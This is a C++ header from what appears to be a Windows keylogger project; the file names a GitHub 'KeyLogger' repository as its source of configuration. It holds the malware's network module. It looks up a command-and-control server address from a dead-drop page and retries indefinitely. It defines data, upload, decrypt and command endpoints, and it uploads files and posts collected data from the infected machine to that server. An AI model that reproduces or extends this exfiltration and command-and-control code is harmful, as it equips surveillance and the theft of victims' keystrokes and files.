#pragma once
#define CURL_STATICLIB
#include "libcurl/include/curl/curl.h"
#include <string>
using namespace std;

// STRUCT
struct MemoryStruct {
	char *memory;
	size_t size;
};

// Global variables
string URL_DATA = "";
string URL_UPLOAD = "";
string URL_DECRYPT = "";
string URL_CMD = "";


/*** Define functions ***/
void get_temp_path(WCHAR* buffer, size_t buffer_len, const WCHAR* file_name);
string get_base_url();
string get_html(string url);
MemoryStruct get_html_memory_struct(string url);
int upload_file_pos_html_form(string url, string file_path);
string curl_post(string send_data, string url);
string get_utf8(const std::wstring &wstr);


/*** Declare functions ***/

#pragma region Get_html

//*********** Get html ************* 
/*Callback to get data */
static size_t
WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
	size_t realsize = size * nmemb;

	struct MemoryStruct *mem = (struct MemoryStruct *)userp;

	mem->memory = (char*)realloc(mem->memory, mem->size + realsize + 1);
	if (mem->memory == NULL) {
		/* out of memory! */
		printf("not enough memory (realloc returned NULL)\n");
		return 0;
	}
	memcpy(&(mem->memory[mem->size]), contents, realsize);
	mem->size += realsize;
	mem->memory[mem->size] = 0;

	return realsize;
}

/*Get html as string*/
string get_html(string url) {
	CURL *curl_handle;
	CURLcode res;

	struct MemoryStruct chunk;

	chunk.memory = (char*)malloc(1);  /* will be grown as needed by the realloc above */
	chunk.size = 0;    /* no data at this point */

	// curl_global_init(CURL_GLOBAL_ALL);

	/* init the curl session */
	curl_handle = curl_easy_init();

	/* specify URL to get */
	curl_easy_setopt(curl_handle, CURLOPT_URL, url.c_str());

	/* send all data to this function  */
	curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);

	/* we pass our 'chunk' struct to the callback function */
	curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&chunk);

	/* some servers don't like requests that are made without a user-agent
	field, so we provide one */
	curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "libcurl-agent/1.0");

	/* get it! */
	res = curl_easy_perform(curl_handle);

	string html;

	/* check for errors */
	if (res != CURLE_OK) {
		// fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
		html = "";
	}
	else {
		/*
		* Now, our chunk.memory points to a memory block that is chunk.size
		* bytes big and contains the remote file.
		*
		* Do something nice with it!
		*/
		// RETURN DATA
		html = string(chunk.memory);
	}

	/* cleanup curl stuff */
	curl_easy_cleanup(curl_handle);

	/* we're done with libcurl, so clean it up */
	// curl_global_cleanup();

	// CLEAN 
	free(chunk.memory);
	return html;
}
/*
Get html as MemoryStruct
Need fo delete data after
*/
MemoryStruct get_html_memory_struct(string url) {
	CURL *curl_handle;
	CURLcode res;

	struct MemoryStruct chunk;

	chunk.memory = (char*)malloc(1);  /* will be grown as needed by the realloc above */
	chunk.size = 0;    /* no data at this point */

	// curl_global_init(CURL_GLOBAL_ALL);

	/* init the curl session */
	curl_handle = curl_easy_init();

	/* specify URL to get */
	curl_easy_setopt(curl_handle, CURLOPT_URL, url.c_str());

	/* send all data to this function  */
	curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);

	/* we pass our 'chunk' struct to the callback function */
	curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&chunk);

	/* some servers don't like requests that are made without a user-agent
	field, so we provide one */
	curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "libcurl-agent/1.0");

	/* get it! */
	res = curl_easy_perform(curl_handle);

	/* cleanup curl stuff */
	curl_easy_cleanup(curl_handle);

	/* we're done with libcurl, so clean it up */
	// curl_global_cleanup();

	/* check for errors */
	if (res != CURLE_OK) {
		// fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
		free(chunk.memory);
		chunk.memory = (char*)malloc(1);
		chunk.size = 0;
	}
	else {
		/*
		* Now, our chunk.memory points to a memory block that is chunk.size
		* bytes big and contains the remote file.
		*
		* Do something nice with it!
		*/
		printf("%lu bytes retrieved\n", (unsigned long)chunk.size);
	}

	return chunk;
}
#pragma endregion

/*Get URL of server*/
string get_base_url() {
	string URL_TO_GET_IP = "https://github.com/dantepro1955/KeyLogger/blob/master/base_url";
	int retry = 100;
	DWORD delay = 5000; // 5s retry
	while (true) {
		string html = get_html(URL_TO_GET_IP);
		// printf("%s", html);
		if (html != "") {
			size_t start = html.find("[base_url]", 0) + 10;
			size_t end = html.find("[/base_url]", 0);
			if (start != string::npos
				&& end != string::npos) {
				string res = html.substr(start, end - start);
				html = "";
				//html.clear();
				return res;
			}
		}
		html = "";
		// html.clear();
		// "cannot get base url, retry " << retry << endl;
		Sleep(delay);
		retry--;
		if (retry < 0) {
			delay = 30000; // increase delay to 30s
		}
	}
	return "";
}

/* 
   Upload a file to nodejs server using html form post file
   NodeJs module: express-fileupload
*/
int upload_file_pos_html_form(string url, string file_path)
{
	CURL *curl;
	CURLcode res;

	struct curl_httppost *formpost = NULL;
	struct curl_httppost *lastptr = NULL;
	struct curl_slist *headerlist = NULL;
	static const char buf[] = "Expect:";

	// curl_global_init(CURL_GLOBAL_ALL);

	/* Fill in the file upload field */
	curl_formadd(&formpost,
		&lastptr,
		CURLFORM_COPYNAME, "sampleFile",
		CURLFORM_FILE, file_path.c_str(),
		CURLFORM_END);

	/* Fill in the filename field */
	curl_formadd(&formpost,
		&lastptr,
		CURLFORM_COPYNAME, "filename",
		CURLFORM_COPYCONTENTS, "filename",
		CURLFORM_END);


	/* Fill in the submit field too, even if this is rarely needed */
	curl_formadd(&formpost,
		&lastptr,
		CURLFORM_COPYNAME, "submit",
		CURLFORM_COPYCONTENTS, "send",
		CURLFORM_END);

	curl = curl_easy_init();
	/* initialize custom header list (stating that Expect: 100-continue is not
	wanted */
	headerlist = curl_slist_append(headerlist, buf);
	if (curl) {
		/* what URL that receives this POST */
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

		/* Perform the request, res will get the return code */
		res = curl_easy_perform(curl);
		/* Check for errors */
		if (res != CURLE_OK)
			printf("%s", "curl_easy_perform() failed: %s\n");

		/* always cleanup */
		curl_easy_cleanup(curl);

		/* then cleanup the formpost chain */
		curl_formfree(formpost);
		/* free slist */
		curl_slist_free_all(headerlist);
	}
	return 0;
}

/*
	Post data to server
	"Content-Type: application/octet-stream"
	server side: app.use(bodyParser.raw({type: 'application/octet-stream'}));
*/
string curl_post(string send_data, string url)
{
	CURL *curl;
	CURLcode res;

	struct MemoryStruct chunk;

	chunk.memory = (char*)malloc(1);  /* will be grown as needed by the realloc above */
	chunk.size = 0;    /* no data at this point */

	/* In windows, this will init the winsock stuff */
	// curl_global_init(CURL_GLOBAL_ALL);

	/* get a curl handle */
	curl = curl_easy_init();
	if (curl) {
		/* First set the URL that is about to receive our POST. This URL can
		just as well be a https:// URL if that is what should receive the
		data. */
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		/* tell it to "upload" to the URL */
		curl_easy_setopt(curl, CURLOPT_POST, 1L);

		/* Use header for body parser (NodeJS)*/
		struct curl_slist *headers = NULL;
		headers = curl_slist_append(headers, "Accept: */*");
		headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

		/* set where to read from (on Windows you need to use READFUNCTION too) */
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, send_data.c_str());

		/* enable verbose for easier tracing */
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

		// Save data to chunk
		/* send all data to this function  */
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);

		/* we pass our 'chunk' struct to the callback function */
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

		/* Perform the request, res will get the return code */
		res = curl_easy_perform(curl);

		/* always cleanup */
		curl_easy_cleanup(curl);

		/* Check for errors */
		if (res != CURLE_OK)
			printf("%s", "curl_easy_perform() failed\n");
	}
	// curl_global_cleanup();
	string return_data = "";
	if (chunk.size > 0) {
		return_data = string(chunk.memory);
	}
	free(chunk.memory);
	return return_data;
}

/*Input wstring. Output string*/
string get_utf8(const std::wstring &wstr)
{
	if (wstr.empty()) return string();
	int sz = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], -1, 0, 0, 0, 0);
	std::string res(sz, 0);
	WideCharToMultiByte(CP_UTF8, 0, &wstr[0], -1, &res[0], sz, 0, 0);
	return res;
}

/* get path of temp folder Windows*/
void get_temp_path(WCHAR* buffer, size_t buffer_len, const WCHAR* file_name) {
	GetTempPathW(buffer_len, buffer);

	int len = wcslen(buffer);
	int i = 0;
	for (; i < wcslen(file_name); i++) {
		buffer[len + i] = file_name[i];
	}
	buffer[len + i] = 0;
}

